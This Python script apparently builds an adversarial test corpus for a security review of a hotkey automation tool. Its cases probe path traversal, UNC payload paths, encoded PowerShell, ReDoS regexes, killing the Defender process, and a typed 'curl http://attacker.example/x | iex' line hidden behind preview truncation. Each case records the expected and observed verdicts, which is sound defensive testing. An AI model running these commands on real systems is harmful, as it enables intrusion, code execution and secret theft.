#!/usr/bin/env python3
"""Adversarial plan corpus for the 2026-08-17 security review.

Every plan here is written to *attack* a stated control rather than to demonstrate a
feature, which is why they live outside `tests/corpus/plans` — that corpus pins what a
correct automation means, and mixing refusals into it would break the golden previews.

Usage:
    python tools/security-review/gen_adversarial_plans.py <output-dir>
    # then, from the repo root:
    #   dotnet build src/HotkeyAI.Cli
    #   pwsh tools/security-review/run_adversarial_plans.ps1 <output-dir>

Each case carries the control it attacks and the verdict the review observed, so a later
run can be diffed against it. `WANT` is what the verdict *should* be once the finding is
fixed; `GOT` is what this validator actually said on 2026-08-17.
"""

import json
import os
import sys

HOME = "C:\\Users\\vaibhav"   # substitute your own profile; the allowed root is %USERPROFILE%

# (file, control attacked, WANT, GOT-on-2026-08-17, plan)
CASES = []


def case(name, control, want, got, keys, actions, variables=None):
    plan = {"schemaVersion": 1, "name": name, "trigger": {"type": "hotkey", "keys": keys}}
    if variables:
        plan["variables"] = variables
    plan["actions"] = actions
    CASES.append((name, control, want, got, plan))


# ---------------------------------------------------------------- safety control 1
case("t01-panic-chord", "panic key", "reject", "ACCEPTED",
     ["CTRL", "ALT", "SHIFT", "ESC"],
     [{"id": "a1", "type": "notify", "message": "this chord now belongs to me"}])

case("t13-201-actions", "step cap", "reject", "reject",
     ["CTRL", "ALT", "D2"],
     [{"id": "a%d" % i, "type": "notify", "message": str(i)} for i in range(201)])

case("t33-single-long-action", "120s wall-clock cap", "reject or bound", "ACCEPTED",
     ["CTRL", "ALT", "D3"],
     [{"id": "a1", "type": "wait_for_window",
       "selector": {"titleContains": "never going to appear"}, "timeoutMs": 300000}])

# ---------------------------------------------------------------- safety control 2
case("t05-traversal-dotdot", "allowed roots", "reject", "reject",
     ["CTRL", "ALT", "F6"],
     [{"id": "a1", "type": "launch_process",
       "path": HOME + "\\..\\..\\Windows\\System32\\cmd.exe"}])

case("t06-traversal-tripledot", "allowed roots", "reject", "ACCEPTED (inert: Win32 keeps '...' literal)",
     ["CTRL", "ALT", "F5"],
     [{"id": "a1", "type": "launch_process",
       "path": HOME + "\\...\\Windows\\System32\\cmd.exe"}])

case("t07-device-path", "allowed roots", "reject", "reject",
     ["CTRL", "ALT", "F4"],
     [{"id": "a1", "type": "launch_process", "path": "\\\\?\\C:\\Windows\\System32\\cmd.exe"}])

case("t08-unc-payload", "allowed roots", "reject", "reject",
     ["CTRL", "ALT", "F3"],
     [{"id": "a1", "type": "launch_process", "path": "\\\\attacker\\share\\payload.exe"}])

case("t09-trailing-dot", "allowed roots", "reject", "reject",
     ["CTRL", "ALT", "F2"],
     [{"id": "a1", "type": "launch_process",
       "path": "C:\\Users\\vaibhav.\\..\\..\\Windows\\System32\\cmd.exe"}])

case("t34-space-dotdot", "allowed roots", "reject or match Win32", "ACCEPTED (Win32 agrees: stays in profile)",
     ["CTRL", "ALT", "F7"],
     [{"id": "a1", "type": "launch_process",
       "path": HOME + "\\.. \\..\\Windows\\System32\\cmd.exe"}])

# The junction case cannot be generated statically — see run_adversarial_plans.ps1,
# which creates a directory junction inside the allowed root and points a plan through it.

case("t19-app-and-path", "allowlist", "reject", "reject",
     ["CTRL", "ALT", "D8"],
     [{"id": "a1", "type": "launch_process", "app": "notepad", "path": HOME + "\\evil.exe"}])

case("t20-unknown-type", "allowlist", "reject", "reject",
     ["CTRL", "ALT", "D9"],
     [{"id": "a1", "type": "run_shell", "command": "whoami"}])

case("t21-unknown-field", "allowlist", "reject", "reject (with oneOf branch noise)",
     ["CTRL", "ALT", "OEM_1"],
     [{"id": "a1", "type": "launch_process", "app": "notepad", "elevated": True}])

case("t28-launch-from-variable", "allowed roots", "reject", "reject",
     ["CTRL", "ALT", "OEM_PLUS"],
     [{"id": "a1", "type": "show_input", "prompt": "exe?", "into": "which"},
      {"id": "a2", "type": "launch_process", "path": "${which}"}],
     variables=[{"name": "which", "type": "text"}])

case("t29-workdir-escape", "allowed roots", "reject", "ACCEPTED (fails only at run time)",
     ["CTRL", "ALT", "OEM_MINUS"],
     [{"id": "a1", "type": "launch_process", "app": "powershell",
       "argv": ["-NoProfile", "-Command", "Get-Process"],
       "workingDirectory": "C:\\Windows\\System32"}])

case("t35-file-primitives-outside-root", "allowed roots", "reject", "ACCEPTED (fails only at run time)",
     ["CTRL", "ALT", "OEM_2"],
     [{"id": "a1", "type": "open_path", "path": "C:\\Windows\\System32\\cmd.exe"},
      {"id": "a2", "type": "list_files", "path": "C:\\Windows", "into": "f"},
      {"id": "a3", "type": "path_exists", "path": "C:\\Windows\\win.ini", "into": "b"}],
     variables=[{"name": "f", "type": "pathList"}, {"name": "b", "type": "boolean"}])

case("t30-argv-payload", "no shell primitive", "accept, but preview must disclose", "ACCEPTED, preview discloses",
     ["CTRL", "ALT", "OEM_COMMA"],
     [{"id": "a1", "type": "launch_process", "app": "powershell",
       "argv": ["-NoProfile", "-EncodedCommand", "dwBoAG8AYQBtAGkA"]}])

case("t10-open-exe-in-profile", "open_path", "warn or reject executables", "ACCEPTED",
     ["CTRL", "ALT", "F1"],
     [{"id": "a1", "type": "open_path", "path": HOME + "\\Downloads\\invoice.pdf.exe"}])

case("t11-open-everything", "open_path", "warn: executes attacker-dropped files", "ACCEPTED",
     ["CTRL", "ALT", "D0"],
     [{"id": "a1", "type": "list_files", "path": HOME + "\\Downloads", "pattern": "*",
       "depth": 5, "into": "files"},
      {"id": "a2", "type": "foreach", "source": "files", "itemVariable": "f",
       "maxIterations": 100,
       "body": [{"id": "a3", "type": "open_path", "path": "${f.fullPath}"}]}],
     variables=[{"name": "files", "type": "pathList"}, {"name": "f", "type": "path"}])

# ---------------------------------------------------------------- safety control 3
case("t18-redos-regex", "window selector", "reject or bound the regex", "ACCEPTED",
     ["CTRL", "ALT", "D7"],
     [{"id": "a1", "type": "focus_window", "selector": {"titleRegex": "^(a+)+$"}},
      {"id": "a2", "type": "wait_for_window",
       "selector": {"titleRegex": "^(([a-z])+.)+[A-Z]([a-z])+$"}, "timeoutMs": 300000}])

case("t36-type-into-password-field", "sensitive-window guard", "refuse at run time", "runs (no password-style check)",
     ["CTRL", "ALT", "OEM_3"],
     [{"id": "a1", "type": "focus_window", "selector": {"processName": "chrome"}},
      {"id": "a2", "type": "type_text", "text": "master-password-guess"},
      {"id": "a3", "type": "send_keys", "keys": ["ENTER"]}])

case("t37-long-type-race", "sensitive-window guard", "re-check mid-type", "checked once, then 5ms/char",
     ["CTRL", "ALT", "OEM_4"],
     [{"id": "a1", "type": "type_text", "text": "x" * 2000},
      {"id": "a2", "type": "send_keys", "keys": ["CTRL", "V"], "repeat": 50}])

# ---------------------------------------------------------------- safety control 4
case("t32-preview-truncation", "trust on first use", "preview must show the whole payload",
     "ACCEPTED, preview truncates at 60 chars",
     ["CTRL", "ALT", "T"],
     [{"id": "a1", "type": "focus_window", "selector": {"processName": "terminal"}},
      {"id": "a2", "type": "type_text",
       "text": "Meeting notes for the Tuesday standup, nothing to see here"
               " && curl http://attacker.example/x | iex ; $env:SECRET"},
      {"id": "a3", "type": "send_keys", "keys": ["ENTER"]}])

# ---------------------------------------------------------------- safety control 5
case("t27-terminate-security-agent", "destructive confirmation", "accept, confirm at run time",
     "ACCEPTED, confirms every run",
     ["CTRL", "ALT", "OEM_7"],
     [{"id": "a1", "type": "terminate_process", "processName": "MsMpEng", "force": True}])

# ---------------------------------------------------------------- safety control 6
case("t38-abort-leaks-clipboard", "never log secrets", "redact", "ACCEPTED, clipboard lands in the log",
     ["CTRL", "ALT", "OEM_5"],
     [{"id": "a1", "type": "get_clipboard", "into": "c"},
      {"id": "a2", "type": "abort", "reason": "bailing out with ${c}"}],
     variables=[{"name": "c", "type": "text"}])

case("t24-secret-in-plan", "never log secrets", "warn on a literal credential", "ACCEPTED silently",
     ["CTRL", "ALT", "OEM_6"],
     [{"id": "a1", "type": "focus_window", "selector": {"processName": "chrome"}},
      {"id": "a2", "type": "type_text", "text": "Solulever$Prod2026!"},
      {"id": "a3", "type": "send_keys", "keys": ["ENTER"]}])

# ---------------------------------------------------------------- dataflow / verification
case("t02-undeclared-in-expect", "dataflow check", "reject", "ACCEPTED",
     ["CTRL", "ALT", "F9"],
     [{"id": "a1", "type": "notify", "message": "hi",
       "expect": {"type": "path_exists", "path": "${ghost}\\marker.txt"}}])

case("t03-undeclared-in-predicate", "dataflow check", "reject", "ACCEPTED",
     ["CTRL", "ALT", "F8"],
     [{"id": "a1", "type": "if",
       "condition": {"type": "variable_equals", "variable": "real", "value": "${ghost}"},
       "then": [{"id": "a2", "type": "notify", "message": "then"}], "else": []}],
     variables=[{"name": "real", "type": "text"}])

case("t04-loop-var-escapes", "loop scoping", "reject", "ACCEPTED",
     ["CTRL", "ALT", "F10"],
     [{"id": "a1", "type": "list_directories", "path": HOME + "\\Documents", "into": "dirs"},
      {"id": "a2", "type": "foreach", "source": "dirs", "itemVariable": "item",
       "maxIterations": 3,
       "body": [{"id": "a3", "type": "notify", "message": "in loop ${item.name}"}]},
      {"id": "a4", "type": "notify", "message": "after loop: ${item.fullPath}"}],
     variables=[{"name": "dirs", "type": "pathList"}, {"name": "item", "type": "path"}])

case("t12-vacuous-clipboard-expect", "honest verification", "reject or fail at run time",
     "ACCEPTED, reports '(verified)'",
     ["CTRL", "ALT", "D1"],
     [{"id": "a1", "type": "set_clipboard", "text": "anything at all",
       "expect": {"type": "clipboard_matches", "contains": "${ghost}"}}])

case("t26-type-confusion", "dataflow check", "reject", "reject",
     ["CTRL", "ALT", "F11"],
     [{"id": "a1", "type": "list_files", "path": HOME, "into": "t"},
      {"id": "a2", "type": "notify", "message": "${t.name}"}],
     variables=[{"name": "t", "type": "text"}])

# ---------------------------------------------------------------- bounds and shape
case("t14-out-of-bounds", "policy bounds", "reject", "reject",
     ["CTRL", "ALT", "F12"],
     [{"id": "a1", "type": "wait", "durationMs": 30001},
      {"id": "a2", "type": "send_keys", "keys": ["CTRL", "C"], "repeat": 51},
      {"id": "a3", "type": "notify", "message": "x", "timeoutMs": 300001,
       "expect": {"type": "process_running", "processName": "explorer", "withinMs": 120001}},
      {"id": "a4", "type": "list_files", "path": HOME, "depth": 6, "into": "f"}],
     variables=[{"name": "f", "type": "pathList"}])

case("t25-negatives", "policy bounds", "reject", "reject",
     ["CTRL", "ALT", "A"],
     [{"id": "a1", "type": "wait", "durationMs": -1},
      {"id": "a2", "type": "send_keys", "keys": ["CTRL", "C"], "repeat": 0},
      {"id": "a3", "type": "foreach", "source": "l", "itemVariable": "i", "maxIterations": 0,
       "body": [{"id": "a4", "type": "notify", "message": "${i}"}]}],
     variables=[{"name": "l", "type": "pathList"}, {"name": "i", "type": "path"}])

case("t22-integer-overflow", "error quality", "reject, blaming the plan",
     "reject, blaming Hotkey AI",
     ["CTRL", "ALT", "B"],
     [{"id": "a1", "type": "wait", "durationMs": 9223372036854775807}])

case("t15-nesting-4", "nesting limit", "reject", "reject",
     ["CTRL", "ALT", "D4"],
     [{"id": "a1", "type": "if",
       "condition": {"type": "process_running", "processName": "explorer"},
       "then": [{"id": "a2", "type": "if",
                 "condition": {"type": "process_running", "processName": "explorer"},
                 "then": [{"id": "a3", "type": "if",
                           "condition": {"type": "process_running", "processName": "explorer"},
                           "then": [{"id": "a4", "type": "notify", "message": "deep"}],
                           "else": []}], "else": []}], "else": []}])

case("t16-duplicate-ids", "log integrity", "reject", "reject",
     ["CTRL", "ALT", "D5"],
     [{"id": "same", "type": "notify", "message": "one"},
      {"id": "same", "type": "notify", "message": "two"}])

case("t17-two-nonmodifiers", "chord shape", "reject", "reject",
     ["CTRL", "ALT", "D6"],
     [{"id": "a1", "type": "send_keys", "keys": ["CTRL", "K", "D"]}])

case("t23-no-actions", "usefulness", "warn", "ACCEPTED (binds a chord that does nothing)",
     ["CTRL", "ALT", "C"], [])


def main():
    out = sys.argv[1] if len(sys.argv) > 1 else "adversarial"
    os.makedirs(out, exist_ok=True)

    with open(os.path.join(out, "manifest.tsv"), "w", encoding="utf-8") as manifest:
        manifest.write("case\tcontrol\twant\tobserved-2026-08-17\n")
        for name, control, want, got, plan in CASES:
            with open(os.path.join(out, name + ".json"), "w", encoding="utf-8") as f:
                json.dump(plan, f, indent=2)
            manifest.write("%s\t%s\t%s\t%s\n" % (name, control, want, got))

    print("wrote %d cases and manifest.tsv to %s" % (len(CASES), out))


if __name__ == "__main__":
    main()
